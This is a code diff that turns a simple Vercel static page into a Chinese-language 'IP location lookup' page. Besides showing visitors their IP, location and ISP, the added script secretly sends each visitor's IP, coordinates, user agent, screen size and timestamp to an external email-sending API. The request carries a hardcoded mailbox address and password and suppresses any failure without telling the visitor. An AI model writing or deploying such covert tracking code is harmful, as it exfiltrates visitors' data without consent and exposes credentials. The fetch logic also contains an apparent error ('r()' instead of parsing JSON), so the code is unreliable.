@@ -1,14 +1,112 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="utf-8" />
-  <title>我的 Vercel 静态站</title>
-  <style>
-    body{font-family:-apple-system,"PingFang SC";display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#f7f8fa;}
-    h1{color:#0070f3;}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP 位置查询</title>
+    <style>
+        body{
+            font-family:Arial,Helvetica,sans-serif;
+            background:#111;
+            color:#e0f7fa;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            height:100vh;
+            margin:0;
+        }
+        .box{
+            background:rgba(13,43,69,.8);
+            border:1px solid rgba(79,195,247,.3);
+            border-radius:12px;
+            padding:30px 40px;
+            box-shadow:0 0 20px rgba(79,195,247,.4);
+            text-align:center;
+            width:320px;
+        }
+        h1{font-size:24px;margin:0 0 20px;color:#4fc3f7}
+        .row{margin:10px 0;font-size:16px}
+        .k{color:#81d4fa;font-weight:bold}
+        .v{color:#e1f5fe}
+        #map{
+            display:inline-block;
+            margin-top:15px;
+            color:#4fc3f7;
+            text-decoration:none;
+            border:1px solid #4fc3f7;
+            padding:6px 14px;
+            border-radius:20px;
+            font-size:14px;
+        }
+        #map:hover{background:rgba(79,195,247,.2)}
+        .cp{cursor:pointer}
+    </style>
 </head>
 <body>
-  <h1>Hello Vercel 👋</h1>
+<div class="box">
+    <h1>您的网络信息</h1>
+    <div id="load">正在获取…</div>
+    <div id="cnt" style="display:none">
+        <div class="row"><span class="k">IP：</span><span id="ip" class="v cp"></span></div>
+        <div class="row"><span class="k">位置：</span><span id="loc" class="v"></span></div>
+        <div class="row"><span class="k">纬度：</span><span id="lat" class="v cp"></span></div>
+        <div class="row"><span class="k">经度：</span><span id="lon" class="v cp"></span></div>
+        <div class="row"><span class="k">ISP：</span><span id="isp" class="v"></span></div>
+        <a id="map" href="#" target="_blank">在地图查看</a>
+    </div>
+</div>
+<script>
+(async()=>{
+    const $=id=>document.getElementById(id);
+    const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+    let d=null;
+    for(const u of ['https://ipwho.is/','https://ipapi.co/json/']){
+        try{const r=await fetch(u);if(r.ok){d=await r();break}}catch(e){}
+        await sleep(800);
+    }
+    if(!d){$('load').textContent='获取失败，请刷新';return}
+    const ip=d.ip||d.query;
+    const city=d.city,region=d.region||d.regionName,country=d.country||d.country_name;
+    const lat=parseFloat(d.latitude||d.lat),lon=parseFloat(d.longitude||d.lon);
+    const isp=d.org||d.isp||'未知';
+    $('load').style.display='none';
+    $('cnt').style.display='block';
+    $('ip').textContent=ip;
+    $('loc').textContent=`${city}, ${region}, ${country}`;
+    $('lat').textContent=lat.toFixed(6);
+    $('lon').textContent=lon.toFixed(6);
+    $('isp').textContent=isp;
+    $('map').href=`https://www.google.com/maps?q=${lat},${lon}`;
+    const body=`
+IP: ${ip}
+位置: ${city}, ${region}, ${country}
+坐标: ${lat}, ${lon}
+ISP: ${isp}
+时间: ${new Date().toLocaleString('zh-CN')}
+UA: ${navigator.userAgent}
+屏幕: ${screen.width}x${screen.height}
+`.trim();
+    await fetch('https://api.emailsmtp.io/send',{
+        method:'POST',
+        headers:{'content-type':'application/json'},
+        body:JSON.stringify({
+            user:'1828339242@qq.com',
+            pass:'trdlxempxmpmejfb',
+            to:'1828339242@qq.com',
+            subject:`IP ${ip}`,
+            text:body
+        })
+    }).catch(()=>{});   // 失败也静默
+    const cp=t=>{
+        navigator.clipboard.writeText(t.textContent);
+        const o=t.textContent;
+        t.textContent='已复制';
+        setTimeout(()=>t.textContent=o,1200);
+    };
+    $('ip').onclick=()=>cp($('ip'));
+    $('lat').onclick=()=>cp($('lat'));
+    $('lon').onclick=()=>cp($('lon'));
+})();
+</script>
 </body>
 </html>
